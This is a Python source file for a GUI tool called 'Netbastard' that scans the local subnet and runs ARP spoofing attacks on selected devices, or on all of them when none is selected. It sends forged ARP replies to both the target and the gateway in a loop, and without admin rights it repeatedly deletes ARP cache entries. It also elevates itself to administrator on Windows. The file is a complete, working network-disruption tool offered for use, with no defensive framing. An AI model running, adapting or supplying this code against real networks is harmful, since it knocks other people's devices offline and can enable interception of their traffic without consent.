import sys, os, json, time, threading, socket, ipaddress, struct, subprocess, ctypes, tempfile, atexit
from datetime import datetime
from pathlib import Path
from tkinter import ttk, messagebox, scrolledtext, Tk, StringVar, BooleanVar, IntVar
import tkinter as tk

try:
    from scapy.all import ARP, Ether, srp, send, conf
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    import colorama
    colorama.init()
    R, G, Y, C, M, W, B, RS, BR = (
        colorama.Fore.RED, colorama.Fore.GREEN, colorama.Fore.YELLOW,
        colorama.Fore.CYAN, colorama.Fore.MAGENTA, colorama.Fore.WHITE,
        colorama.Fore.BLUE, colorama.Style.RESET_ALL, colorama.Style.BRIGHT
    )
except ImportError:
    R = G = Y = C = M = W = B = RS = BR = ""


CONFIG_PATH = Path(__file__).parent / 'config.json'
DEFAULT_CONFIG = {
    "auto_elevate": True,
    "scan_method": "auto",
    "spoof_interval": 1.0,
    "theme": "dark",
    "scan_range": "192.168.1.0/24",
    "refresh_interval": 3
}


def load_config():
    if CONFIG_PATH.exists():
        try:
            with open(CONFIG_PATH) as f:
                cfg = json.load(f)
            return {**DEFAULT_CONFIG, **cfg}
        except:
            pass
    return dict(DEFAULT_CONFIG)


def save_config(cfg):
    try:
        with open(CONFIG_PATH, 'w') as f:
            json.dump(cfg, f, indent=2)
    except:
        pass


def is_admin():
    try:
        if os.name == 'nt':
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False


def elevate():
    if os.name != 'nt':
        return False
    if is_admin():
        return True
    try:
        script = Path(__file__).resolve()
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, str(script), str(script.parent), 1
        )
        return True
    except:
        return False


def get_mac_via_windows_api(ip):
    if os.name != 'nt':
        return None
    try:
        SendARP = ctypes.windll.iphlpapi.SendARP
        SendARP.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(ctypes.c_ulong)]
        SendARP.restype = ctypes.c_ulong
        ip_bytes = socket.inet_aton(ip)
        ip_int = struct.unpack("!I", ip_bytes)[0]
        mac = ctypes.create_string_buffer(6)
        mac_len = ctypes.c_ulong(6)
        if SendARP(ip_int, 0, mac, ctypes.byref(mac_len)) == 0:
            return ':'.join(f'{b:02x}' for b in mac.raw[:6])
    except:
        pass
    return None


def get_gateway_windows():
    try:
        out = subprocess.check_output(
            ['netsh', 'interface', 'ip', 'show', 'config'],
            shell=True, stderr=subprocess.STDOUT
        ).decode('utf-8', errors='replace')
        for line in out.splitlines():
            if 'gateway' in line.lower() or 'default' in line.lower():
                parts = line.split(':')
                if len(parts) >= 2:
                    ip = parts[-1].strip()
                    try:
                        socket.inet_aton(ip)
                        return ip
                    except:
                        continue
    except:
        pass
    try:
        out = os.popen('ipconfig | findstr /i "gateway" 2>nul').read()
        for line in out.splitlines():
            parts = line.split(':')
            if len(parts) >= 2:
                ip = parts[-1].strip()
                try:
                    socket.inet_aton(ip)
                    return ip
                except:
                    continue
    except:
        pass
    return None


class ARPScanner:
    def __init__(self):
        self.gateway_ip = None
        self.gateway_mac = None
        self.local_ip = None
        self.devices = []
        self.admin = is_admin()

    def detect_network(self):
        if os.name == 'nt':
            if self.admin and SCAPY_OK:
                return self._detect_scapy()
            return self._detect_fallback()
        else:
            return self._detect_linux()

    def _detect_scapy(self):
        try:
            from scapy.arch import get_windows_if_list
            ifaces = get_windows_if_list()
            for iface in ifaces:
                for ip_info in iface.get('ips', []):
                    if ip_info['type'] == 'ipv4' and not ip_info['addr'].startswith('127.'):
                        self.local_ip = ip_info['addr']
                        for gw in iface.get('gateway', []):
                            try:
                                socket.inet_aton(gw)
                                self.gateway_ip = gw
                                return True
                            except:
                                continue
        except:
            pass
        return self._detect_fallback()

    def _detect_fallback(self):
        self.gateway_ip = get_gateway_windows()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
        except:
            self.local_ip = '127.0.0.1'
        s.close()
        return self.gateway_ip is not None

    def _detect_linux(self):
        try:
            out = os.popen("ip route | grep default").read()
            if out:
                parts = out.strip().split()
                self.gateway_ip = parts[2]
            if not self.gateway_ip:
                out = os.popen("route -n | grep 'UG[ ]'").read()
                if out:
                    self.gateway_ip = out.strip().split()[1]
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            return self.gateway_ip is not None
        except:
            return False

    def resolve_gateway_mac(self):
        if self.admin and SCAPY_OK:
            try:
                arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.gateway_ip)
                ans, _ = srp(arp, timeout=2, retry=2, verbose=False)
                for _, rcv in ans:
                    self.gateway_mac = rcv[Ether].src
                    return True
            except:
                pass
        mac = get_mac_via_windows_api(self.gateway_ip)
        if mac:
            self.gateway_mac = mac
            return True
        return False

    def scan(self, progress_callback=None):
        self.devices = []
        if self.admin and SCAPY_OK:
            return self._scan_scapy(progress_callback)
        else:
            return self._scan_api(progress_callback)

    def _scan_scapy(self, progress_callback=None):
        prefix = '.'.join(self.local_ip.split('.')[:3])
        results = []
        lock = threading.Lock()
        threads = []
        done = [0]

        def scan_ip(i):
            target = f"{prefix}.{i}"
            try:
                arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target)
                ans, _ = srp(arp, timeout=1, verbose=False)
                for _, rcv in ans:
                    with lock:
                        results.append({
                            'ip': rcv[ARP].psrc,
                            'mac': rcv[Ether].src,
                            'hostname': ''
                        })
            except:
                pass
            finally:
                with lock:
                    done[0] += 1
                    if progress_callback and done[0] % 10 == 0:
                        progress_callback(done[0], 254)

        for i in range(1, 255):
            t = threading.Thread(target=scan_ip, args=(i,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 50:
                for t in threads:
                    t.join(timeout=3)
                threads = []
        for t in threads:
            t.join(timeout=3)

        for d in results:
            try:
                host = socket.gethostbyaddr(d['ip'])
                d['hostname'] = host[0]
            except:
                pass
        results.sort(key=lambda x: [int(o) for o in x['ip'].split('.')])
        self.devices = results
        return results

    def _scan_api(self, progress_callback=None):
        prefix = '.'.join(self.local_ip.split('.')[:3])
        results = []
        lock = threading.Lock()
        threads = []
        done = [0]

        def scan_ip(i):
            target = f"{prefix}.{i}"
            mac = get_mac_via_windows_api(target)
            if mac:
                hostname = ''
                try:
                    host = socket.gethostbyaddr(target)
                    hostname = host[0]
                except:
                    pass
                with lock:
                    results.append({'ip': target, 'mac': mac, 'hostname': hostname})
            with lock:
                done[0] += 1
                if progress_callback and done[0] % 10 == 0:
                    progress_callback(done[0], 254)

        for i in range(1, 255):
            t = threading.Thread(target=scan_ip, args=(i,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=3)
                threads = []
        for t in threads:
            t.join(timeout=3)

        results.sort(key=lambda x: [int(o) for o in x['ip'].split('.')])
        self.devices = results
        return results


class ARPAttacker:
    def __init__(self, scanner):
        self.scanner = scanner
        self.gateway_ip = scanner.gateway_ip
        self.gateway_mac = scanner.gateway_mac
        self.attacks = {}
        self.admin = scanner.admin

    def start_attack(self, target_ip, target_mac, status_callback=None):
        if target_ip in self.attacks and self.attacks[target_ip]['active']:
            return False
        stop_event = threading.Event()
        self.attacks[target_ip] = {
            'mac': target_mac,
            'active': True,
            'online': True,
            'packets': 0,
            'started': datetime.now(),
            'disconnected_at': None,
            'stop': stop_event
        }
        t1 = threading.Thread(target=self._spoof_loop, args=(target_ip, target_mac, stop_event, status_callback), daemon=True)
        t2 = threading.Thread(target=self._monitor_loop, args=(target_ip, stop_event, status_callback), daemon=True)
        self.attacks[target_ip]['threads'] = [t1, t2]
        t1.start()
        t2.start()
        return True

    def _spoof_loop(self, target_ip, target_mac, stop_event, status_callback):
        if self.admin and SCAPY_OK:
            poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
            poison_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip)
            while not stop_event.is_set():
                try:
                    send(poison_target, verbose=False)
                    send(poison_gateway, verbose=False)
                except:
                    pass
                self.attacks[target_ip]['packets'] += 2
                if status_callback:
                    status_callback()
                time.sleep(1)
        else:
            self.log(f"Non-admin mode: ARP cache disruption on {target_ip}")
            while not stop_event.is_set():
                try:
                    subprocess.run(
                        ['arp', '-d', target_ip],
                        shell=True, capture_output=True, timeout=5
                    )
                except:
                    pass
                try:
                    subprocess.run(
                        ['arp', '-d', self.gateway_ip],
                        shell=True, capture_output=True, timeout=5
                    )
                except:
                    pass
                self.attacks[target_ip]['packets'] += 1
                if status_callback:
                    status_callback()
                time.sleep(3)

    def _monitor_loop(self, target_ip, stop_event, status_callback):
        while not stop_event.is_set():
            mac = get_mac_via_windows_api(target_ip)
            online = mac is not None
            self.attacks[target_ip]['online'] = online
            if not online and self.attacks[target_ip]['disconnected_at'] is None:
                self.attacks[target_ip]['disconnected_at'] = datetime.now()
                if status_callback:
                    status_callback()
            for _ in range(3):
                if stop_event.is_set():
                    break
                time.sleep(1)

    def stop_attack(self, target_ip, status_callback=None):
        if target_ip not in self.attacks:
            return False
        self.attacks[target_ip]['stop'].set()
        for t in self.attacks[target_ip].get('threads', []):
            t.join(timeout=3)
        if self.admin and SCAPY_OK:
            target_mac = self.attacks[target_ip]['mac']
            try:
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), count=4, verbose=False)
            except:
                pass
        self.attacks[target_ip]['active'] = False
        if status_callback:
            status_callback()
        return True

    def stop_all(self, status_callback=None):
        for ip in list(self.attacks.keys()):
            self.stop_attack(ip, status_callback)


class NetbastardGUI:
    def __init__(self):
        self.config = load_config()
        self.admin = is_admin()
        self.scanner = ARPScanner()
        self.attacker = None
        self.scanning = False
        self.running = True

        self.root = tk.Tk()
        self.root.title("Netbastard - Network Isolation Tool")
        self.root.geometry("950x680")
        self.root.minsize(800, 550)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        self.style = ttk.Style()
        self._setup_style()

        self._build_ui()
        self.log("Netbastard GUI started")
        self.log(f"Admin: {'YES' if self.admin else 'NO'} | Scapy: {'OK' if SCAPY_OK else 'N/A'}")

        if not self.admin:
            self.log("Running without admin privileges (limited functionality)")

        self.root.after(500, self.auto_detect)

    def _setup_style(self):
        if self.config.get('theme') == 'dark':
            bg, fg, sel = '#1e1e1e', '#d4d4d4', '#264f78'
            self.root.configure(bg=bg)
            self.style.theme_use('clam')
            self.style.configure('TFrame', background=bg)
            self.style.configure('TLabel', background=bg, foreground=fg)
            self.style.configure('TButton', background='#0e639c', foreground='white', borderwidth=1, focusthickness=0)
            self.style.map('TButton', background=[('active', '#1177bb')])
            self.style.configure('Treeview', background='#252526', foreground=fg, fieldbackground='#252526', rowheight=26)
            self.style.configure('Treeview.Heading', background='#333333', foreground=fg, relief='flat')
            self.style.map('Treeview', background=[('selected', sel)])
            self.style.configure('TLabelframe', background=bg, foreground=fg)
            self.style.configure('TLabelframe.Label', background=bg, foreground=fg)
            self.style.configure('TEntry', fieldbackground='#3c3c3c', foreground=fg)
            self.style.configure('Vertical.TScrollbar', background='#333333', troughcolor='#252526')
            self._dark_bg = bg
            self._dark_fg = fg
        else:
            self._dark_bg = '#f0f0f0'
            self._dark_fg = '#222'

    def _build_ui(self):
        top = ttk.Frame(self.root)
        top.pack(fill=tk.X, padx=8, pady=(8, 2))
        ttk.Label(top, text="Netbastard", font=('Consolas', 16, 'bold'), foreground='#cc4444').pack(side=tk.LEFT, padx=(0, 10))
        self.admin_lbl = ttk.Label(top, text="")
        self.admin_lbl.pack(side=tk.LEFT, padx=5)
        self.update_admin_label()

        ctrl_frame = ttk.Frame(self.root)
        ctrl_frame.pack(fill=tk.X, padx=8, pady=4)
        self.scan_btn = ttk.Button(ctrl_frame, text="Scan Network", command=self.start_scan)
        self.scan_btn.pack(side=tk.LEFT, padx=(0, 5))
        self.stop_scan_btn = ttk.Button(ctrl_frame, text="Stop Attack", command=self.stop_selected)
        self.stop_scan_btn.pack(side=tk.LEFT, padx=5)
        self.stopall_btn = ttk.Button(ctrl_frame, text="Stop All", command=self.stop_all)
        self.stopall_btn.pack(side=tk.LEFT, padx=5)

        self.status_bar = ttk.Label(ctrl_frame, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(10, 0))

        panes = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
        panes.pack(fill=tk.BOTH, expand=True, padx=8, pady=4)

        left = ttk.Frame(panes)
        panes.add(left, weight=3)
        right = ttk.Frame(panes)
        panes.add(right, weight=2)

        dev_frame = ttk.LabelFrame(left, text="Devices")
        dev_frame.pack(fill=tk.BOTH, expand=True)
        cols = ('sel', 'ip', 'mac', 'hostname', 'status')
        self.tree = ttk.Treeview(dev_frame, columns=cols, show='headings', height=14, selectmode='extended')
        self.tree.heading('sel', text='')
        self.tree.heading('ip', text='IP Address')
        self.tree.heading('mac', text='MAC Address')
        self.tree.heading('hostname', text='Hostname')
        self.tree.heading('status', text='Status')
        self.tree.column('sel', width=30, anchor=tk.CENTER)
        self.tree.column('ip', width=120)
        self.tree.column('mac', width=130)
        self.tree.column('hostname', width=160)
        self.tree.column('status', width=80)
        self.tree.bind('<ButtonRelease-1>', self.on_tree_click)

        vsb = ttk.Scrollbar(dev_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        right_top = ttk.LabelFrame(right, text="Attack Control")
        right_top.pack(fill=tk.BOTH, expand=True)

        info_frame = ttk.Frame(right_top)
        info_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(info_frame, text="Target IP:").grid(row=0, column=0, sticky=tk.W, padx=2)
        self.target_ip_var = StringVar()
        ttk.Label(info_frame, textvariable=self.target_ip_var, foreground='#cc4444').grid(row=0, column=1, sticky=tk.W, padx=5)
        ttk.Label(info_frame, text="Packets:").grid(row=0, column=2, sticky=tk.W, padx=(15, 2))
        self.pkt_var = StringVar(value="0")
        ttk.Label(info_frame, textvariable=self.pkt_var).grid(row=0, column=3, sticky=tk.W, padx=5)
        ttk.Label(info_frame, text="Status:").grid(row=1, column=0, sticky=tk.W, padx=2)
        self.status_var = StringVar(value="Idle")
        ttk.Label(info_frame, textvariable=self.status_var, foreground='#4ec9b0').grid(row=1, column=1, sticky=tk.W, padx=5)
        ttk.Label(info_frame, text="Duration:").grid(row=1, column=2, sticky=tk.W, padx=(15, 2))
        self.dur_var = StringVar(value="00:00")
        ttk.Label(info_frame, textvariable=self.dur_var).grid(row=1, column=3, sticky=tk.W, padx=5)

        self.attack_btn = ttk.Button(right_top, text="Attack Selected", command=self.attack_selected)
        self.attack_btn.pack(pady=5)

        status_frame = ttk.LabelFrame(right_top, text="Attack Status")
        status_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.status_tree = ttk.Treeview(status_frame, columns=('ip', 'state', 'pkts', 'time'), show='headings', height=6)
        self.status_tree.heading('ip', text='Target')
        self.status_tree.heading('state', text='State')
        self.status_tree.heading('pkts', text='Packets')
        self.status_tree.heading('time', text='Duration')
        self.status_tree.column('ip', width=100)
        self.status_tree.column('state', width=80)
        self.status_tree.column('pkts', width=70)
        self.status_tree.column('time', width=80)
        self.status_tree.pack(fill=tk.BOTH, expand=True)

        log_frame = ttk.LabelFrame(self.root, text="Log")
        log_frame.pack(fill=tk.BOTH, padx=8, pady=(0, 8))
        self.log_area = scrolledtext.ScrolledText(
            log_frame, height=8, font=('Consolas', 9),
            bg=self._dark_bg, fg=self._dark_fg, insertbackground=self._dark_fg
        )
        self.log_area.pack(fill=tk.BOTH, expand=True)
        self.log_area.config(state=tk.DISABLED)

    def update_admin_label(self):
        if self.admin:
            self.admin_lbl.config(text="[ADMIN]", foreground='#4ec9b0')
        else:
            self.admin_lbl.config(text="[USER]", foreground='#cc4444')

    def log(self, msg):
        ts = datetime.now().strftime('%H:%M:%S')
        try:
            self.log_area.config(state=tk.NORMAL)
            self.log_area.insert(tk.END, f"[{ts}] {msg}\n")
            self.log_area.see(tk.END)
            self.log_area.config(state=tk.DISABLED)
        except:
            pass

    def set_status(self, msg):
        self.status_bar.config(text=msg)
        self.root.update_idletasks()

    def auto_detect(self):
        self.log("Detecting network...")
        self.set_status("Detecting network...")
        if self.scanner.detect_network():
            self.log(f"Gateway: {self.scanner.gateway_ip}")
            self.log(f"Local IP: {self.scanner.local_ip}")
            if self.scanner.resolve_gateway_mac():
                self.log(f"Gateway MAC: {self.scanner.gateway_mac}")
            else:
                self.log("Could not resolve gateway MAC - trying scan anyway")
            self.attacker = ARPAttacker(self.scanner)
            self.start_scan()
        else:
            self.log("Could not detect network automatically")
            self.set_status("Network detection failed")
            self.prompt_manual_config()

    def prompt_manual_config(self):
        d = tk.Toplevel(self.root)
        d.title("Manual Network Configuration")
        d.geometry("400x200")
        d.transient(self.root)
        d.grab_set()
        ttk.Label(d, text="Gateway IP:").pack(pady=(15, 2))
        gw_var = StringVar()
        ttk.Entry(d, textvariable=gw_var, width=25).pack()
        ttk.Label(d, text="Your IP:").pack(pady=(10, 2))
        ip_var = StringVar()
        ttk.Entry(d, textvariable=ip_var, width=25).pack()
        def apply():
            gw = gw_var.get().strip()
            ip = ip_var.get().strip()
            if gw and ip:
                try:
                    socket.inet_aton(gw)
                    socket.inet_aton(ip)
                except:
                    messagebox.showerror("Error", "Invalid IP address")
                    return
                self.scanner.gateway_ip = gw
                self.scanner.local_ip = ip
                self.attacker = ARPAttacker(self.scanner)
                self.log(f"Manual config: GW={gw}, IP={ip}")
                d.destroy()
                self.start_scan()
            else:
                messagebox.showerror("Error", "Both fields required")
        ttk.Button(d, text="Apply", command=apply).pack(pady=15)

    def start_scan(self):
        if self.scanning:
            return
        self.scanning = True
        self.scan_btn.config(text="Scanning...", state=tk.DISABLED)
        self.tree.delete(*self.tree.get_children())
        self.set_status("Scanning network...")
        self.log("Network scan started")
        threading.Thread(target=self._do_scan, daemon=True).start()

    def _do_scan(self):
        def progress(done, total):
            self.set_status(f"Scanning... {done}/{total}")
        devices = self.scanner.scan(progress_callback=progress)
        self.root.after(0, self._scan_done, devices)

    def _scan_done(self, devices):
        self.tree.delete(*self.tree.get_children())
        for d in devices:
            ip = d['ip']
            mac = d['mac']
            hostname = d.get('hostname', '') or ''
            atk = self.attacker.attacks.get(ip, {}) if self.attacker else {}
            if atk.get('active'):
                status = 'ATTACK' if not atk.get('online', True) else 'ONLINE'
            else:
                status = 'Online'
            sel = '☑' if atk.get('active') else ''
            self.tree.insert('', tk.END, values=(sel, ip, mac, hostname[:30], status))
        self.scan_btn.config(text="Scan Network", state=tk.NORMAL)
        self.set_status(f"Scan complete: {len(devices)} devices")
        self.log(f"Found {len(devices)} devices")
        self.scanning = False

    def on_tree_click(self, event):
        region = self.tree.identify_region(event.x, event.y)
        if region == 'cell':
            col = self.tree.identify_column(event.x)
            if col == '#1':
                item = self.tree.identify_row(event.y)
                if item:
                    vals = list(self.tree.item(item, 'values'))
                    if vals:
                        vals[0] = '' if vals[0] == '☑' else '☑'
                        self.tree.item(item, values=vals)

    def get_selected_ips(self):
        ips = []
        for item in self.tree.get_children():
            vals = self.tree.item(item, 'values')
            if vals and vals[0] == '☑':
                ips.append(vals[1])
        return ips

    def get_all_device_ips(self):
        ips = []
        for item in self.tree.get_children():
            vals = self.tree.item(item, 'values')
            if vals:
                ips.append(vals[1])
        return ips

    def attack_selected(self):
        if not self.attacker:
            messagebox.showwarning("Warning", "Network not configured")
            return
        targets = self.get_selected_ips()
        if not targets:
            targets = self.get_all_device_ips()
            if not targets:
                messagebox.showwarning("Warning", "No devices found. Scan first.")
                return
        for ip in targets:
            mac = None
            for d in self.scanner.devices:
                if d['ip'] == ip:
                    mac = d['mac']
                    break
            if mac:
                self.attacker.start_attack(ip, mac, self.update_devices)
                self.log(f"Attack started: {ip}")
        self.update_devices()
        self._refresh_status()

    def stop_selected(self):
        if not self.attacker:
            return
        targets = self.get_selected_ips()
        if not targets:
            messagebox.showwarning("Warning", "No targets selected")
            return
        for ip in targets:
            self.attacker.stop_attack(ip, self.update_devices)
            self.log(f"Attack stopped: {ip}")
        self.update_devices()
        self._refresh_status()

    def stop_all(self):
        if self.attacker:
            self.attacker.stop_all(self.update_devices)
            self.log("All attacks stopped")
        self.update_devices()
        self._refresh_status()

    def update_devices(self):
        pass

    def _refresh_status(self):
        if not self.attacker:
            return
        for item in self.status_tree.get_children():
            self.status_tree.delete(item)
        for ip, info in self.attacker.attacks.items():
            if info['active']:
                state = 'OFFLINE' if not info['online'] else 'ONLINE'
                elapsed = datetime.now() - info['started']
                m, s = divmod(int(elapsed.total_seconds()), 60)
                dur = f"{m:02d}:{s:02d}"
                self.status_tree.insert('', tk.END, values=(ip, state, str(info['packets']), dur))

    def refresh_loop(self):
        if not self.running:
            return
        if self.attacker:
            self._refresh_status()
        self.root.after(2000, self.refresh_loop)

    def on_close(self):
        self.running = False
        if self.attacker:
            self.log("Stopping all attacks...")
            self.attacker.stop_all()
        self.root.destroy()

    def run(self):
        self.root.after(2000, self.refresh_loop)
        self.root.mainloop()


def main():
    cfg = load_config()
    if not is_admin() and cfg.get('auto_elevate', True) and os.name == 'nt':
        print("Elevating to administrator privileges...")
        try:
            script = Path(__file__).resolve()
            ret = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{script}"', str(script.parent), 1
            )
            if ret <= 32:
                print("Elevation cancelled or failed, continuing with limited mode.")
            else:
                return
        except:
            pass
    app = NetbastardGUI()
    app.run()


if __name__ == '__main__':
    main()
